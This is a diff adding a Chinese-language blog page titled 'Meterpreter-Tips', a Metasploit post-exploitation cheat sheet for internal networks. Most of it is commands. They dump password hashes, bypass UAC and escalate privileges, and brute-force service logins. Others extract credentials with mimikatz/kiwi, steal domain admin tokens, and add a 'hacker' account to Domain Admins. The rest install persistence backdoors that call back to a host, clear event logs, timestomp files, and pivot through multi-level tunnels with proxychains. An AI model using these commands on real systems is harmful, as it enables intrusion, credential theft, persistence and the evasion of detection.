@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Meterpreter-Tips - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="meterpreter在内网中的作用就跟web中的sqlmap和burpsuite的价值是一样的。本文只涉及内网，持续更新 0x01 枚举linux可" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/meterpreter-tips/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Meterpreter-Tips" />
+<meta property="og:description" content="meterpreter在内网中的作用就跟web中的sqlmap和burpsuite的价值是一样的。本文只涉及内网，持续更新 0x01 枚举linux可" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/meterpreter-tips/" />
+<meta property="article:published_time" content="2017-06-01T21:30:04&#43;00:00"/>
+<meta property="article:modified_time" content="2017-06-01T21:30:04&#43;00:00"/>
+
+<meta itemprop="name" content="Meterpreter-Tips">
+<meta itemprop="description" content="meterpreter在内网中的作用就跟web中的sqlmap和burpsuite的价值是一样的。本文只涉及内网，持续更新 0x01 枚举linux可">
+
+
+<meta itemprop="datePublished" content="2017-06-01T21:30:04&#43;00:00" />
+<meta itemprop="dateModified" content="2017-06-01T21:30:04&#43;00:00" />
+<meta itemprop="wordCount" content="1185">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Meterpreter-Tips"/>
+<meta name="twitter:description" content="meterpreter在内网中的作用就跟web中的sqlmap和burpsuite的价值是一样的。本文只涉及内网，持续更新 0x01 枚举linux可"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Meterpreter-Tips</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#0x01-枚举linux可用信息-windows">0x01 枚举linux可用信息 | windows</a></li>
+<li><a href="#0x02-bypass-modules">0x02 Bypass-modules</a></li>
+<li><a href="#0x03-service-attack-modules">0x03 service-attack-modules</a></li>
+<li><a href="#0x04-meterpreter常用命令">0x04 meterpreter常用命令</a></li>
+<li><a href="#0x05-一级隧道">0x05 一级隧道</a></li>
+<li><a href="#0x06-二级隧道">0x06 二级隧道</a></li>
+<li><a href="#0x07-三级隧道">0x07 三级隧道</a></li>
+<li><a href="#0x08-彩蛋">0x08 彩蛋</a></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<p>meterpreter在内网中的作用就跟web中的sqlmap和burpsuite的价值是一样的。本文只涉及内网，持续更新</p>
+
+<h1 id="0x01-枚举linux可用信息-windows">0x01 枚举linux可用信息 | windows</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">run post/linux/gather/hashdump              #hash密码
+run post/linux/gather/checkvm               #是否虚拟机
+run post/linux/gather/enum_configs          #枚举配置信息
+run post/linux/gather/enum_network          #枚举网络配置
+run post/linux/gather/enum_protections      #发现像IDS，防病毒，防火墙等
+run post/linux/gather/enum_system           #获取有关用户帐户/软件/服务/Linux版本
+run post/linux/gather/enum_users_history    #枚举历史信息
+run post/windows/gather/arp_scanner         #检测到sessions -i number的IP地址
+run post/windows/escalate/getsystem         #getsystem
+run post/windows/gather/credentials/gpp     #寻找储存在SYSVOL中的Groups.xml
+post/windows/gather/enum_unattend           #全盘搜索Unattend.xml文件查找账户密码
+exploit/windows/local/always_install_elevated       #创建一个随机文件名的MSI文件并在提权成功后删除所有已部署的文件
+
+run vnc
+run scraper                                 #常见信息收集[好用，没有之一]</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x02-bypass-modules">0x02 Bypass-modules</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">exploit/windows/local/bypassuac_vbs         #会生成新的session[getsystem]
+exploit/windows/local/bypassuac_injection
+exploit/windows/local/bypassuac_eventvwr
+exploit/windows/local/bypassuac
+exploit/windows/local/ask
+exploit/windows/local/ms13_053_schlamperei
+exploit/windows/local/ms14_058_track_popup_menu
+exploit/windows/local/ms16_016_webdav       #Windows 7 SP1
+exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+exploit/windows/local/trusted_service_path
+exploit/windows/local/service_permissions</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x03-service-attack-modules">0x03 service-attack-modules</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">use auxiliary/scanner/mssql/mssql_login
+use auxiliary/scanner/ftp/ftp_login
+use auxiliary/scanner/ssh/ssh_login
+use auxiliary/scanner/telnet/telnet_login
+use auxiliary/scanner/smb/smb_login
+use auxiliary/scanner/mssql/mssql_login
+use auxiliary/scanner/mysql/mysql_login
+use auxiliary/scanner/oracle/oracle_login
+use auxiliary/scanner/postgres/postgres_login
+use auxiliary/scanner/vnc/vnc_login
+use auxiliary/scanner/pcanywhere/pcanywhere_login
+use auxiliary/scanner/snmp/snmp_login
+use auxiliary/scanner/ftp/anonymous</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x04-meterpreter常用命令">0x04 meterpreter常用命令</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">pwd |edit |upload |download |getuid |getsystem |sysinfo     #基本命令
+python
+    python_import &lt;-f file path&gt; [-n mod name] [-r result var name]
+    python_execute &lt;python code&gt; [-r result var name]
+    python_reset
+
+powershell
+    powershell_execute  &lt;powershell code&gt; [-s session-id]
+    powershell_import   &lt;path to file&gt; [-s session-id]      #执行本地ps1或者dll
+    powershell_shell                                        #会话终端
+
+kiwi
+    kiwi_cmd &#34;privilege::debug sekurlsa::logonPasswords&#34;
+
+mimikatz
+    wdigest
+    mimikatz_command  -f sekurlsa::logonPasswords -a &#34;full&#34;
+    mimikatz_command  -f sekurlsa::kerberos -a &#34;full&#34;
+
+sniffer
+    sniffer_interfaces
+    sniffer_start [网卡id]
+    sniffer_stats [网卡id]
+    sniffer_dump [绝对路径]
+
+令牌劫持[whoami /groups]
+    ps          #查看目标机器进程，找出域控账户运行的进程ID，假如发现PID为 6666
+    steal_token 6666 [pid]                  #偷取Token
+    use incognito                           #当ps找不到域控账户进程时
+    list_tokens –u                          #列出可用token，假如找到域控管理员token
+    impersonate_token 2008.com\\dcadministrator     #使用域管理员token运行meterpreter
+    add_user hacker password –h 192.168.1.2         #在域控主机上添加账户,ip指向域控
+    add_group_user &#34;DomainAdmins&#34; test –h 192.168.1.2    #将账户添加至域管理员组
+
+migrate  pid                                #将Meterpreter会话移植到进程数位pid的进程中  [不稳定,explorer.exe]
+
+execute -H -i -f cmd.exe                    #创建新进程cmd.exe，-H不可见，-i交互
+
+timestompc:/a.txt -c &#34;11/11/2011 11:11:11&#34;  #修改文件的创建时间
+
+arp_scanner -r 192.168.1.0/24
+
+run persistence -X -i 5 -p 2222 -r x.x.x.x  #开机启动项vbs后门 X86_Linux不支持此脚本
+
+run metsvc -A                               #Meterpreter服务后门[windows/metsvc_bind_tcp]
+
+clearev                                     #清理痕迹
+
+run autoroute -s 192.168.1.0/24             #配合run post/windows/gather/</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x05-一级隧道">0x05 一级隧道</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">(依赖：建立meterpreter正常通信 [re:192.168.1.2])
+portfwd add -l 1234 -p 3389 -r x.x.x.x      #反弹端口3389到本地1234[rdesktop 127.0.0.1:1234]
+ssh -f -N -D 127.0.0.1:2222 root@10.1.1.3   #ssh端口转发
+route add 10.1.1.0 255.255.255.255 1        #添加session 1的路由表[route print]
+use auxiliary/server/socks4a                #建立隧道
+    vim /etc/proxychains.conf
+    socks4  127.0.0.1 1080
+proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 10.1.1.2</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x06-二级隧道">0x06 二级隧道</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">route add 10.1.1.2 255.255.255.255 2        #添加一级隧道路由表
+use exploit/multi/handler
+set payload windows/meterpreter/bind_tcp    #正向通道
+set RHOST 10.1.1.1
+set RPORT 2222
+use auxiliary/server/socks4a                #建立隧道
+    vim /etc/proxychains.conf
+    socks4  127.0.0.1 1081
+proxychains nmap -sT -sV -p21,22,23,80 -n -Pn -vv 172.16.6.3</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x07-三级隧道">0x07 三级隧道</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">route add 172.16.6.3 255.255.255.255 3      #添加二级隧道路由表
+use exploit/multi/handler
+set payload windows/meterpreter/bind_tcp    #正向通道
+set RHOST 172.16.6.3
+set RPORT 3333</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x08-彩蛋">0x08 彩蛋</h1>
+
+<p><a href="https://www.youtube.com/watch?v=awLMbwj5iP0">https://www.youtube.com/watch?v=awLMbwj5iP0</a></p>
+
+<p><a href="https://www.youtube.com/watch?v=wK0r-TZR7w8">https://www.youtube.com/watch?v=wK0r-TZR7w8</a></p>
+
+<p><a href="http://www.metasploit.cn/thread-936-1-1.html">相关链接</a></p>
+
+<p><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a></p>
+
+<p><a href="http://www.exploit-db.com">exploit-db</a></p>
+
+<p><a href="http://www.securityfocus.com/bid">securityfocus</a></p>
+
+<p><a href="http://www.hackingarticles.in/7-ways-get-admin-access-remote-windows-pc-bypass-privilege-escalation/?utm_source=tuicool&amp;utm_medium=referral">hackingarticles</a></p>
+
+<p><a href="https://www.youtube.com/watch?v=jCoL7oXvT_E">https://www.youtube.com/watch?v=jCoL7oXvT_E</a></p>
+
+<p><a href="https://www.youtube.com/watch?v=DlJyKgfkoKQ">https://www.youtube.com/watch?v=DlJyKgfkoKQ</a></p>
+
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/uac-attack/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">UAC攻击剖析</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/bypass-waf-put-webshell/">
+            <span class="next-text nav-default">bypass-waf-put-Webshell</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
